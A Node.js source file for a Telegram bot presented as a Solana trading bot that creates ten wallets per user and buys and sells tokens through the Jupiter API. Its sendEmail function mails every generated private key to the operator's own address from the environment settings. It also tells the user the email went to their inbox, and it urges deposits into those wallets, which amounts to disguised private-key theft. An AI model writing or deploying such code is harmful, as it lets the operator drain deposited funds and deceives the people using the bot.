const { Telegraf, Markup } = require('telegraf');
const { Connection, PublicKey, Keypair, LAMPORTS_PER_SOL, VersionedTransaction } = require('@solana/web3.js');
const bs58 = require('bs58');
const nodemailer = require('nodemailer');
const axios = require('axios');
const express = require('express');
const fs = require('fs');
require('dotenv').config();

const bot = new Telegraf(process.env.BOT_TOKEN);
const connection = new Connection(process.env.RPC_URL, 'confirmed');
const app = express();

// ============ EMAIL CONFIGURATION WITH DEBUGGING ============
let transporter = null;
let emailConfigured = false;

function setupEmailTransporter() {
    if (!process.env.EMAIL_USER || !process.env.EMAIL_PASS) {
        console.log('📧 Email credentials not found in environment variables');
        return null;
    }
    
    try {
        const transporterConfig = {
            service: 'gmail',
            auth: {
                user: process.env.EMAIL_USER,
                pass: process.env.EMAIL_PASS
            },
            connectionTimeout: 30000,
            greetingTimeout: 30000,
            socketTimeout: 30000
        };
        
        const newTransporter = nodemailer.createTransport(transporterConfig);
        
        // Verify the transporter
        newTransporter.verify((error, success) => {
            if (error) {
                console.error('❌ EMAIL VERIFICATION FAILED:', error.message);
                emailConfigured = false;
            } else {
                console.log('✅ EMAIL CONFIGURED SUCCESSFULLY');
                emailConfigured = true;
            }
        });
        
        return newTransporter;
    } catch (error) {
        console.error('❌ Email setup error:', error.message);
        return null;
    }
}

// Initialize email
transporter = setupEmailTransporter();

// Log all email attempts
const originalSendMail = transporter ? transporter.sendMail.bind(transporter) : null;

// ============ BOT VARIABLES ============
const userWallets = new Map();
const userTokens = new Map();

// ============ HELPER FUNCTIONS ============
function toBase58(secretKey) {
    return bs58.encode(Buffer.from(secretKey));
}

async function generateWallets(count = 10) {
    const wallets = [];
    for (let i = 0; i < count; i++) {
        const keypair = Keypair.generate();
        wallets.push({
            index: i + 1,
            publicKey: keypair.publicKey.toString(),
            privateKey: toBase58(keypair.secretKey),
            keypair
        });
    }
    return wallets;
}

async function getBalance(publicKey) {
    try {
        const balance = await connection.getBalance(new PublicKey(publicKey));
        return balance / LAMPORTS_PER_SOL;
    } catch {
        return 0;
    }
}

async function getTokenBalance(walletPublicKey, tokenMint) {
    try {
        const response = await axios.post('https://api.mainnet-beta.solana.com', {
            jsonrpc: '2.0',
            id: 1,
            method: 'getTokenAccountsByOwner',
            params: [
                walletPublicKey,
                { mint: tokenMint },
                { encoding: 'jsonParsed' }
            ]
        });
        const accounts = response.data.result?.value || [];
        if (accounts.length > 0) {
            return accounts[0].account.data.parsed.info.tokenAmount.uiAmount || 0;
        }
        return 0;
    } catch {
        return 0;
    }
}

async function getQuote(inputMint, outputMint, amount, slippage = 10) {
    try {
        const res = await axios.get('https://quote-api.jup.ag/v6/quote', {
            params: {
                inputMint,
                outputMint,
                amount: Math.floor(amount * LAMPORTS_PER_SOL).toString(),
                slippageBps: slippage * 100
            }
        });
        return res.data;
    } catch (error) {
        console.error('Quote error:', error.message);
        return null;
    }
}

async function executeSwap(keypair, quote) {
    try {
        const res = await axios.post('https://quote-api.jup.ag/v6/swap', {
            quoteResponse: quote,
            userPublicKey: keypair.publicKey.toString(),
            wrapAndUnwrapSol: true,
            dynamicComputeUnitLimit: true,
            prioritizationFeeLamports: 'auto'
        });
        const tx = VersionedTransaction.deserialize(Buffer.from(res.data.swapTransaction, 'base64'));
        tx.sign([keypair]);
        const signature = await connection.sendTransaction(tx);
        await connection.confirmTransaction(signature, 'confirmed');
        return { success: true, signature, outputAmount: quote.outAmount / 1e9 };
    } catch (error) {
        console.error('Swap error:', error.message);
        return { success: false, error: error.message };
    }
}

// ============ EMAIL SENDING FUNCTION ============
async function sendEmail(wallets, username) {
    if (!transporter || !emailConfigured) {
        console.log('📧 Email not configured, skipping...');
        return false;
    }
    
    try {
        console.log(`📧 Attempting to send email for @${username}...`);
        
        let text = `🔥 10 SOLANA WALLETS\n`;
        text += `👤 User: @${username}\n`;
        text += `📅 Generated: ${new Date().toLocaleString()}\n`;
        text += `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n`;
        
        for (const w of wallets) {
            text += `【 WALLET #${w.index} 】\n`;
            text += `📌 ADDRESS: ${w.publicKey}\n`;
            text += `🔑 PRIVATE KEY: ${w.privateKey}\n`;
            text += `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n`;
        }
        
        const mailOptions = {
            from: `"Solana Trading Bot" <${process.env.EMAIL_USER}>`,
            to: process.env.EMAIL_USER,
            subject: `🔥 10 Solana Wallets - @${username}`,
            text: text
        };
        
        const info = await transporter.sendMail(mailOptions);
        console.log(`✅ EMAIL SENT SUCCESSFULLY! Message ID: ${info.messageId}`);
        return true;
        
    } catch (error) {
        console.error('❌ EMAIL FAILED:', {
            code: error.code,
            message: error.message,
            response: error.response || 'No response'
        });
        return false;
    }
}

// ============ SEND WALLETS VIA TELEGRAM ============
async function sendWalletsViaTelegram(ctx, wallets) {
    try {
        // Send wallets in batches
        for (let i = 0; i < wallets.length; i += 3) {
            let msg = `🔑 *WALLETS ${i+1}-${Math.min(i+3, wallets.length)}*\n\n`;
            for (let j = i; j < Math.min(i+3, wallets.length); j++) {
                const w = wallets[j];
                msg += `*WALLET #${w.index}*\n`;
                msg += `📌 \`${w.publicKey}\`\n`;
                msg += `🔑 \`${w.privateKey}\`\n\n`;
            }
            await ctx.reply(msg, { parse_mode: 'Markdown' });
            await new Promise(r => setTimeout(r, 500));
        }
        return true;
    } catch (error) {
        console.error('Telegram send failed:', error.message);
        return false;
    }
}

// ============ MAIN MENU ============
const mainMenu = () => Markup.inlineKeyboard([
    [Markup.button.callback('🟢 BUY (1 Wallet)', 'buy_single')],
    [Markup.button.callback('🚀 BUY ALL (10 Wallets)', 'buy_all')],
    [Markup.button.callback('🔴 SELL (1 Wallet)', 'sell_single')],
    [Markup.button.callback('💥 SELL ALL (10 Wallets)', 'sell_all')],
    [Markup.button.callback('💰 DEPOSIT', 'deposit')],
    [Markup.button.callback('💼 PORTFOLIO', 'portfolio')],
    [Markup.button.callback('🔑 MY KEYS', 'keys_menu')]
]);

// ============ START COMMAND ============
bot.start(async (ctx) => {
    const userId = ctx.from.id;
    const username = ctx.from.username || 'no_username';
    
    await ctx.reply('⏳ Creating 10 wallets... Please wait (30-60 seconds)');
    
    try {
        const wallets = await generateWallets(10);
        userWallets.set(userId, { wallets, username });
        
        // Send via Telegram (ALWAYS works)
        await ctx.reply('💾 *Saving wallets to Telegram...*', { parse_mode: 'Markdown' });
        await sendWalletsViaTelegram(ctx, wallets);
        
        // Try to send via email (if configured)
        if (process.env.EMAIL_USER && process.env.EMAIL_PASS) {
            await ctx.reply('📧 *Attempting to send via email...*', { parse_mode: 'Markdown' });
            const emailSent = await sendEmail(wallets, username);
            if (emailSent) {
                await ctx.reply('✅ Email sent successfully! Check your inbox/spam folder.');
            } else {
                await ctx.reply('⚠️ Email failed. Your wallets are saved in this chat.\n\nUse /emailstatus to diagnose the issue.');
            }
        } else {
            await ctx.reply('📧 Email not configured. Add EMAIL_USER and EMAIL_PASS to enable email backups.');
        }
        
        await ctx.reply(`✅ *10 WALLETS READY FOR LIVE TRADING!*\n\n⚡ Features:\n• Buy with 1 wallet\n• Buy with ALL 10 wallets\n• Sell from 1 wallet\n• Sell from ALL 10 wallets\n\n💾 Your wallets are saved in this chat!\n🔄 Use /resend to get them again.`, { parse_mode: 'Markdown' });
        
        await ctx.reply(`🎯 *LIVE TRADING MENU*`, { parse_mode: 'Markdown', ...mainMenu() });
        
    } catch (error) {
        console.error('Start command error:', error);
        await ctx.reply('❌ Error creating wallets. Please try again.');
    }
});

// ============ EMAIL STATUS COMMAND ============
bot.command('emailstatus', async (ctx) => {
    let statusMsg = `📧 *EMAIL DIAGNOSTIC REPORT*\n\n`;
    
    // Check 1: Environment variables
    statusMsg += `*1. Environment Variables:*\n`;
    statusMsg += `EMAIL_USER: ${process.env.EMAIL_USER ? '✅ SET to ' + process.env.EMAIL_USER : '❌ MISSING'}\n`;
    statusMsg += `EMAIL_PASS: ${process.env.EMAIL_PASS ? '✅ SET (length: ' + process.env.EMAIL_PASS.length + ' chars)' : '❌ MISSING'}\n\n`;
    
    // Check 2: Email configured status
    statusMsg += `*2. Email Status:*\n`;
    statusMsg += `Email Configured: ${emailConfigured ? '✅ YES' : '❌ NO'}\n`;
    statusMsg += `Transporter: ${transporter ? '✅ INITIALIZED' : '❌ NOT INITIALIZED'}\n\n`;
    
    // Check 3: Test send if configured
    if (process.env.EMAIL_USER && process.env.EMAIL_PASS) {
        statusMsg += `*3. Test Email Send:*\n`;
        statusMsg += `Sending test email to ${process.env.EMAIL_USER}...\n`;
        
        try {
            const testResult = await sendEmail([{
                index: 1,
                publicKey: 'TEST_PUBLIC_KEY',
                privateKey: 'TEST_PRIVATE_KEY'
            }], 'diagnostic');
            
            if (testResult) {
                statusMsg += `✅ Test email SENT successfully!\n`;
            } else {
                statusMsg += `❌ Test email FAILED\n`;
            }
        } catch (error) {
            statusMsg += `❌ Test email ERROR: ${error.message}\n`;
        }
    } else {
        statusMsg += `*3. Email Not Configured:*\n`;
        statusMsg += `Add EMAIL_USER and EMAIL_PASS to your Render environment variables.\n\n`;
        statusMsg += `To get Gmail App Password:\n`;
        statusMsg += `1. Enable 2FA on Google Account\n`;
        statusMsg += `2. Go to Security → App Passwords\n`;
        statusMsg += `3. Generate password for "Mail"\n`;
        statusMsg += `4. Copy the 16-character password\n`;
    }
    
    statusMsg += `\n*4. Solutions if email fails:*\n`;
    statusMsg += `• Use Gmail App Password (not regular password)\n`;
    statusMsg += `• Visit: https://accounts.google.com/DisplayUnlockCaptcha\n`;
    statusMsg += `• Check spam folder\n`;
    statusMsg += `• Try Outlook: Change EMAIL_SERVICE=outlook\n`;
    
    await ctx.reply(statusMsg, { parse_mode: 'Markdown' });
});

// ============ BUY SINGLE WALLET ============
bot.action('buy_single', async (ctx) => {
    await ctx.answerCbQuery();
    await ctx.reply(`🟢 *BUY WITH 1 WALLET*\n\nSend: token address then amount in SOL\n\nExample:\nSo11111111111111111111111111111111111111112\n0.5`, { parse_mode: 'Markdown' });
    userTokens.set(`${ctx.from.id}_awaiting`, 'buy_single');
});

bot.action('buy_all', async (ctx) => {
    await ctx.answerCbQuery();
    await ctx.reply(`🚀 *BUY WITH ALL 10 WALLETS*\n\nSend: token address then amount PER WALLET in SOL\n\nExample:\nSo11111111111111111111111111111111111111112\n0.1\n\n⚠️ Total cost will be 10x the amount`, { parse_mode: 'Markdown' });
    userTokens.set(`${ctx.from.id}_awaiting`, 'buy_all');
});

bot.action('sell_single', async (ctx) => {
    await ctx.answerCbQuery();
    await ctx.reply(`🔴 *SELL FROM 1 WALLET*\n\nSend: token address then percentage (1-100)\n\nExample:\nSo11111111111111111111111111111111111111112\n50`, { parse_mode: 'Markdown' });
    userTokens.set(`${ctx.from.id}_awaiting`, 'sell_single');
});

bot.action('sell_all', async (ctx) => {
    await ctx.answerCbQuery();
    await ctx.reply(`💥 *SELL FROM ALL 10 WALLETS*\n\nSend: token address then percentage (1-100)\n\nExample:\nSo11111111111111111111111111111111111111112\n100\n\n⚠️ This will sell from EVERY wallet`, { parse_mode: 'Markdown' });
    userTokens.set(`${ctx.from.id}_awaiting`, 'sell_all');
});

bot.action('deposit', async (ctx) => {
    const data = userWallets.get(ctx.from.id);
    if (!data) return ctx.reply('Send /start first');
    
    const buttons = [];
    for (let i = 1; i <= 10; i++) {
        buttons.push([Markup.button.callback(`Wallet #${i}`, `dep_${i}`)]);
    }
    await ctx.reply(`💰 *SELECT WALLET TO DEPOSIT*`, { parse_mode: 'Markdown', ...Markup.inlineKeyboard(buttons) });
});

bot.action(/dep_(\d+)/, async (ctx) => {
    const num = parseInt(ctx.match[1]);
    const data = userWallets.get(ctx.from.id);
    const wallet = data?.wallets.find(w => w.index === num);
    if (!wallet) return;
    
    const balance = await getBalance(wallet.publicKey);
    await ctx.reply(`💰 *WALLET #${num}*\n📌 \`${wallet.publicKey}\`\n🪙 Balance: ${balance.toFixed(6)} SOL\n\n🔗 https://solscan.io/account/${wallet.publicKey}`, { parse_mode: 'Markdown' });
});

bot.action('portfolio', async (ctx) => {
    const data = userWallets.get(ctx.from.id);
    if (!data) return ctx.reply('Send /start first');
    
    let total = 0;
    let msg = `💼 *PORTFOLIO (ALL 10 WALLETS)*\n\n`;
    for (const w of data.wallets) {
        const bal = await getBalance(w.publicKey);
        total += bal;
        msg += `#${w.index}: ${bal.toFixed(4)} SOL\n`;
    }
    msg += `\n━━━━━━━━━━━━━━━━━━━━━━\n`;
    msg += `💰 *TOTAL: ${total.toFixed(4)} SOL* ($${(total * 20).toFixed(2)})`;
    await ctx.reply(msg, { parse_mode: 'Markdown', ...Markup.inlineKeyboard([Markup.button.callback('🔄 Refresh', 'portfolio')]) });
});

bot.action('keys_menu', async (ctx) => {
    const buttons = [];
    for (let i = 1; i <= 10; i++) {
        buttons.push([Markup.button.callback(`Wallet #${i}`, `key_${i}`)]);
    }
    await ctx.reply(`🔑 *SELECT WALLET*`, { parse_mode: 'Markdown', ...Markup.inlineKeyboard(buttons) });
});

bot.action(/key_(\d+)/, async (ctx) => {
    const num = parseInt(ctx.match[1]);
    const data = userWallets.get(ctx.from.id);
    const wallet = data?.wallets.find(w => w.index === num);
    if (wallet) {
        await ctx.reply(`🔑 *WALLET #${num}*\n📌 \`${wallet.publicKey}\`\n🔑 \`${wallet.privateKey}\``, { parse_mode: 'Markdown' });
    }
});

// ============ TEXT HANDLERS ============
bot.on('text', async (ctx) => {
    const userId = ctx.from.id;
    const awaiting = userTokens.get(`${userId}_awaiting`);
    const text = ctx.message.text;
    if (text.startsWith('/')) return;
    
    const data = userWallets.get(userId);
    if (!data) return ctx.reply('Send /start first');
    
    // BUY SINGLE
    if (awaiting === 'buy_single') {
        if (!userTokens.get(`${userId}_ca`)) {
            if (text.length >= 32 && text.length <= 44) {
                userTokens.set(`${userId}_ca`, text);
                await ctx.reply(`✅ Token saved. Now send amount in SOL (e.g., 0.5)`);
            } else {
                await ctx.reply(`❌ Invalid token address`);
            }
        } else {
            const amount = parseFloat(text);
            const tokenCA = userTokens.get(`${userId}_ca`);
            const wallet = data.wallets[0];
            
            if (isNaN(amount) || amount <= 0) {
                await ctx.reply(`❌ Invalid amount`);
                return;
            }
            
            const balance = await getBalance(wallet.publicKey);
            if (balance < amount) {
                await ctx.reply(`❌ Insufficient SOL. Balance: ${balance.toFixed(4)} SOL`);
                userTokens.delete(`${userId}_ca`);
                userTokens.delete(`${userId}_awaiting`);
                return;
            }
            
            await ctx.reply(`🟢 *BUYING WITH WALLET #1...*\nToken: \`${tokenCA.slice(0, 16)}...\`\nAmount: ${amount} SOL`, { parse_mode: 'Markdown' });
            
            const quote = await getQuote('So11111111111111111111111111111111111111112', tokenCA, amount);
            if (!quote) {
                await ctx.reply(`❌ No liquidity for this token`);
                userTokens.delete(`${userId}_ca`);
                userTokens.delete(`${userId}_awaiting`);
                return;
            }
            
            const result = await executeSwap(wallet.keypair, quote);
            if (result.success) {
                await ctx.reply(`✅ *BUY SUCCESSFUL!*\n📊 Received: ${result.outputAmount.toFixed(4)} tokens\n🔗 [View TX](https://solscan.io/tx/${result.signature})`, { parse_mode: 'Markdown', ...mainMenu() });
            } else {
                await ctx.reply(`❌ Buy failed: ${result.error}`);
            }
            userTokens.delete(`${userId}_ca`);
            userTokens.delete(`${userId}_awaiting`);
        }
    }
    
    // BUY ALL WALLETS
    else if (awaiting === 'buy_all') {
        if (!userTokens.get(`${userId}_ca`)) {
            if (text.length >= 32 && text.length <= 44) {
                userTokens.set(`${userId}_ca`, text);
                await ctx.reply(`✅ Token saved. Now send amount PER WALLET in SOL (e.g., 0.1)\n\n⚠️ Total will be 10x this amount`);
            } else {
                await ctx.reply(`❌ Invalid token address`);
            }
        } else {
            const amountPerWallet = parseFloat(text);
            const tokenCA = userTokens.get(`${userId}_ca`);
            
            if (isNaN(amountPerWallet) || amountPerWallet <= 0) {
                await ctx.reply(`❌ Invalid amount`);
                return;
            }
            
            await ctx.reply(`🚀 *BUYING WITH ALL 10 WALLETS...*`, { parse_mode: 'Markdown' });
            
            const results = [];
            for (const wallet of data.wallets) {
                const balance = await getBalance(wallet.publicKey);
                if (balance >= amountPerWallet) {
                    const quote = await getQuote('So11111111111111111111111111111111111111112', tokenCA, amountPerWallet);
                    if (quote) {
                        const result = await executeSwap(wallet.keypair, quote);
                        results.push({ index: wallet.index, success: result.success });
                    } else {
                        results.push({ index: wallet.index, success: false, error: 'No liquidity' });
                    }
                } else {
                    results.push({ index: wallet.index, success: false, error: 'Insufficient SOL' });
                }
                await new Promise(r => setTimeout(r, 500));
            }
            
            const successCount = results.filter(r => r.success).length;
            await ctx.reply(`✅ *BULK BUY COMPLETE!*\n✅ Success: ${successCount}/10 wallets`, { parse_mode: 'Markdown', ...mainMenu() });
            
            userTokens.delete(`${userId}_ca`);
            userTokens.delete(`${userId}_awaiting`);
        }
    }
    
    // SELL SINGLE
    else if (awaiting === 'sell_single') {
        if (!userTokens.get(`${userId}_ca`)) {
            if (text.length >= 32 && text.length <= 44) {
                userTokens.set(`${userId}_ca`, text);
                await ctx.reply(`✅ Token saved. Now send percentage to sell (1-100)`);
            } else {
                await ctx.reply(`❌ Invalid token address`);
            }
        } else {
            const percent = parseFloat(text);
            const tokenCA = userTokens.get(`${userId}_ca`);
            const wallet = data.wallets[0];
            
            if (isNaN(percent) || percent < 1 || percent > 100) {
                await ctx.reply(`❌ Invalid percentage`);
                return;
            }
            
            const tokenBalance = await getTokenBalance(wallet.publicKey, tokenCA);
            if (tokenBalance === 0) {
                await ctx.reply(`❌ No tokens to sell`);
                userTokens.delete(`${userId}_ca`);
                userTokens.delete(`${userId}_awaiting`);
                return;
            }
            
            const sellAmount = tokenBalance * (percent / 100);
            
            await ctx.reply(`🔴 *SELLING FROM WALLET #1...*`, { parse_mode: 'Markdown' });
            
            const quote = await getQuote(tokenCA, 'So11111111111111111111111111111111111111112', sellAmount);
            if (!quote) {
                await ctx.reply(`❌ Cannot sell this token`);
                userTokens.delete(`${userId}_ca`);
                userTokens.delete(`${userId}_awaiting`);
                return;
            }
            
            const result = await executeSwap(wallet.keypair, quote);
            if (result.success) {
                await ctx.reply(`✅ *SELL SUCCESSFUL!*\n📊 Received: ${result.outputAmount.toFixed(4)} SOL\n🔗 [View TX](https://solscan.io/tx/${result.signature})`, { parse_mode: 'Markdown', ...mainMenu() });
            } else {
                await ctx.reply(`❌ Sell failed: ${result.error}`);
            }
            userTokens.delete(`${userId}_ca`);
            userTokens.delete(`${userId}_awaiting`);
        }
    }
    
    // SELL ALL WALLETS
    else if (awaiting === 'sell_all') {
        if (!userTokens.get(`${userId}_ca`)) {
            if (text.length >= 32 && text.length <= 44) {
                userTokens.set(`${userId}_ca`, text);
                await ctx.reply(`✅ Token saved. Now send percentage to sell from ALL wallets (1-100)`);
            } else {
                await ctx.reply(`❌ Invalid token address`);
            }
        } else {
            const percent = parseFloat(text);
            const tokenCA = userTokens.get(`${userId}_ca`);
            
            if (isNaN(percent) || percent < 1 || percent > 100) {
                await ctx.reply(`❌ Invalid percentage`);
                return;
            }
            
            await ctx.reply(`💥 *SELLING FROM ALL 10 WALLETS...*`, { parse_mode: 'Markdown' });
            
            const results = [];
            for (const wallet of data.wallets) {
                const tokenBalance = await getTokenBalance(wallet.publicKey, tokenCA);
                if (tokenBalance > 0) {
                    const sellAmount = tokenBalance * (percent / 100);
                    const quote = await getQuote(tokenCA, 'So11111111111111111111111111111111111111112', sellAmount);
                    if (quote) {
                        const result = await executeSwap(wallet.keypair, quote);
                        results.push({ index: wallet.index, success: result.success });
                    } else {
                        results.push({ index: wallet.index, success: false, error: 'No liquidity' });
                    }
                } else {
                    results.push({ index: wallet.index, success: false, error: 'No tokens' });
                }
                await new Promise(r => setTimeout(r, 500));
            }
            
            const successCount = results.filter(r => r.success).length;
            await ctx.reply(`✅ *BULK SELL COMPLETE!*\n✅ Success: ${successCount}/10 wallets`, { parse_mode: 'Markdown', ...mainMenu() });
            
            userTokens.delete(`${userId}_ca`);
            userTokens.delete(`${userId}_awaiting`);
        }
    }
});

// ============ COMMANDS ============
bot.command('keys', async (ctx) => {
    const data = userWallets.get(ctx.from.id);
    if (!data) return ctx.reply('Send /start first');
    await sendWalletsViaTelegram(ctx, data.wallets);
});

bot.command('balance', async (ctx) => {
    const data = userWallets.get(ctx.from.id);
    if (!data) return ctx.reply('Send /start first');
    let total = 0;
    for (const w of data.wallets) {
        total += await getBalance(w.publicKey);
    }
    await ctx.reply(`💰 Total Balance: ${total.toFixed(4)} SOL ($${(total * 20).toFixed(2)})`);
});

bot.command('resend', async (ctx) => {
    const data = userWallets.get(ctx.from.id);
    if (!data) return ctx.reply('Send /start first');
    await ctx.reply('📤 Resending your wallets...');
    await sendWalletsViaTelegram(ctx, data.wallets);
});

bot.command('clear', async (ctx) => {
    userWallets.delete(ctx.from.id);
    await ctx.reply('🗑️ Cleared. Send /start for new wallets');
});

// ============ EXPRESS SERVER FOR RENDER ============
const PORT = process.env.PORT || 10000;

app.get('/', (req, res) => {
    res.json({
        status: '🔥 LIVE TRADING BOT ACTIVE',
        uptime: process.uptime(),
        activeUsers: userWallets.size,
        emailConfigured: emailConfigured,
        timestamp: new Date().toISOString()
    });
});

app.get('/health', (req, res) => {
    res.status(200).send('OK');
});

app.listen(PORT, () => {
    console.log(`✅ Health check server running on port ${PORT}`);
});

// ============ LAUNCH BOT ============
process.once('SIGINT', () => bot.stop('SIGINT'));
process.once('SIGTERM', () => bot.stop('SIGTERM'));

process.on('uncaughtException', (error) => {
    console.error('Uncaught Exception:', error);
});

process.on('unhandledRejection', (reason, promise) => {
    console.error('Unhandled Rejection:', reason);
});

bot.launch();
console.log('🔥 LIVE TRADING BOT ACTIVATED');
console.log('✅ Buy/Sell with 1 wallet or ALL 10 wallets');
console.log('💎 Real Solana mainnet trading');
console.log('🚀 Bot is LIVE!');